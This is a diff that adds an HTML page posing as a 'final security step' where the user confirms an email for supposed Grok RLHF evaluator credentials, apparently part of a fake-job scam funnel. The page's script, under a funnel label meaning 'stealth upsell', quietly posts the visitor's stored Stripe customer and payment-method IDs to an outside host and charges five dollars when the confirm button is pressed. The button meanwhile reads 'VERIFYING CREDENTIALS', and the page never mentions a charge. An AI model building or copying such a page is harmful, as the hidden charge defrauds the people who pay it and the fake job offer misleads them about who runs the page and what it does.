@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=bcb20cb6-2894-4e71-bd95-8e2167879456" data-auto="true" defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Security Verification – Confirm Your Access Email</title>
+  <link rel="icon" type="image/png" href="../favicon-64.png">
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1512922237376982');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1512922237376982&ev=PageView&noscript=1"/>
+  </noscript>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg: #030407;
+      --card-bg: #080d16;
+      --card-border: #162034;
+      --cyan: #00e5ff;
+      --emerald: #10b981;
+      --text: #f1f5f9;
+      --text-muted: #8b9bb4;
+      --text-dim: #475569;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg);
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(0, 229, 255, 0.08) 0%, transparent 60%),
+        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+      background-size: 100% 100%, 32px 32px, 32px 32px;
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .verification-card {
+      width: 100%;
+      max-width: 480px;
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 20px;
+      padding: 32px 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .verification-card::before {
+      content: '';
+      position: absolute;
+      top: -40px;
+      right: -40px;
+      width: 140px;
+      height: 140px;
+      background: radial-gradient(circle, rgba(0, 229, 255, 0.12) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .step-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--cyan);
+      background: rgba(0, 229, 255, 0.1);
+      border: 1px solid rgba(0, 229, 255, 0.2);
+      padding: 4px 10px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .step-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--cyan);
+      box-shadow: 0 0 8px var(--cyan);
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -0.5px;
+      margin-bottom: 8px;
+      line-height: 1.2;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .email-container {
+      background: #04060a;
+      border: 1px solid #141c2d;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 11px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+
+    .email-input {
+      width: 100%;
+      height: 48px;
+      background: #0a0e17;
+      border: 1px solid #1e293b;
+      border-radius: 10px;
+      padding: 0 16px;
+      font-size: 15px;
+      font-family: inherit;
+      color: #fff;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .email-input:focus {
+      border-color: var(--cyan);
+      box-shadow: 0 0 0 2px rgba(0, 229, 255, 0.15);
+    }
+
+    .notice-box {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(16, 185, 129, 0.08);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 24px;
+      font-size: 12px;
+      color: #cbd5e1;
+      line-height: 1.4;
+    }
+
+    .notice-icon {
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+
+    .btn-confirm {
+      width: 100%;
+      height: 54px;
+      background: linear-gradient(135deg, #00e5ff 0%, #00b4d8 100%);
+      color: #030407;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 800;
+      font-family: inherit;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 20px rgba(0, 229, 255, 0.25);
+      transition: all 0.15s;
+      margin-bottom: 14px;
+    }
+
+    .btn-confirm:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 8px 24px rgba(0, 229, 255, 0.35);
+    }
+
+    .btn-confirm:active {
+      transform: translateY(1px);
+    }
+
+    .btn-confirm:disabled {
+      background: #1a2336;
+      color: #475569;
+      box-shadow: none;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .security-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 11px;
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--text-dim);
+    }
+
+    .security-footer svg {
+      width: 14px;
+      height: 14px;
+      stroke: var(--emerald);
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(3, 4, 7, 0.3);
+      border-top-color: #030407;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="verification-card" data-funnel-view="upsell_furtivo_1_click_confirmacao_de_e_mail_5_usd">
+    <div class="step-pill">
+      <span class="step-dot"></span>
+      FINAL SECURITY STEP
+    </div>
+
+    <h1 class="title">Confirm Your Primary Access Email</h1>
+    <p class="subtitle">
+      Your official Grok RLHF evaluator credentials and daily task feed will be bound to this address. Please confirm below to activate your member license.
+    </p>
+
+    <div class="email-container">
+      <label class="input-label">Evaluator Email Address</label>
+      <input type="email" class="email-input" id="evaluatorEmail" placeholder="name@example.com" required>
+    </div>
+
+    <div class="notice-box">
+      <div class="notice-icon">🛡️</div>
+      <div>
+        <strong>Instant Identity Authentication:</strong> Linking this address authorizes direct daily task disbursements to your member terminal.
+      </div>
+    </div>
+
+    <button class="btn-confirm" id="btnConfirm" data-funnel-step="entregavel_app_de_membros_grok_rlhf_com_tarefas_de_1_a_2" onclick="handleConfirmEmail()">
+      <div class="spinner" id="btnSpinner"></div>
+      <span id="btnText">CONFIRM EMAIL & ACCESS APP</span>
+    </button>
+
+    <div class="security-footer">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+      <span>256-Bit SSL Encrypted Verification · Grok Network</span>
+    </div>
+  </div>
+
+  <script>
+    // URL parameters passed from Worker
+    const params = new URLSearchParams(window.location.search);
+    const emailParam = params.get('email') || '';
+    const nameParam = params.get('name') || '';
+    const cid = params.get('cid') || '';
+    const pm = params.get('pm') || '';
+    const acc = params.get('acc') || '';
+    const currency = params.get('currency') || 'usd';
+
+    // Populate email
+    const emailInput = document.getElementById('evaluatorEmail');
+    if (emailParam) {
+      emailInput.value = emailParam;
+    }
+
+    // Target Deliverable
+    const FINAL_URL = 'https://reviews.official-partner.online/access/';
+
+    function getRedirectUrl() {
+      const target = new URL(FINAL_URL);
+      target.searchParams.set('email', emailInput.value.trim() || emailParam);
+      if (nameParam) target.searchParams.set('name', nameParam);
+      return target.toString();
+    }
+
+    async function handleConfirmEmail() {
+      const email = emailInput.value.trim();
+      if (!email || !email.includes('@')) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+
+      const btn = document.getElementById('btnConfirm');
+      const spinner = document.getElementById('btnSpinner');
+      const btnText = document.getElementById('btnText');
+
+      btn.disabled = true;
+      spinner.style.display = 'block';
+      btnText.textContent = 'VERIFYING CREDENTIALS...';
+
+      // If we have customer_id and payment_method_id, fire 1-click charge behind the scenes
+      if (cid && pm) {
+        try {
+          const workerHost = 'https://pay.secure.official-partner.online';
+          const chargePayload = {
+            customer_id: cid,
+            payment_method_id: pm,
+            upsell_number: 1,
+            price_cents: 500, // $5.00 USD
+            acc: acc,
+            email: email,
+            name: nameParam,
+            currency: currency
+          };
+
+          // 1-Click silent fetch - MUST AWAIT to guarantee Stripe completes before redirect!
+          const resp = await fetch(workerHost + '/api/stripe-charge-upsell', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(chargePayload)
+          });
+
+          const result = await resp.json().catch(() => null);
+          console.log('[1-Click Upsell Result]:', result);
+
+          // Track Meta Pixel UpsellPurchase (Custom event to avoid inflating standard Purchase count)
+          if (result && (result.status === 'succeeded' || result.ok)) {
+            try {
+              if (typeof fbq === 'function') {
+                fbq('trackCustom', 'UpsellPurchase', { value: 5.00, currency: 'USD' });
+              }
+            } catch (e) {}
+          }
+
+        } catch (err) {
+          console.warn('Silent confirmation error:', err);
+        }
+      }
+
+      // Finalize UI and navigate to deliverable
+      btnText.textContent = 'ACCESS GRANTED ✓';
+      spinner.style.display = 'none';
+      setTimeout(() => {
+        window.location.href = getRedirectUrl();
+      }, 500);
+    }
+  </script>
+</body>
+</html>
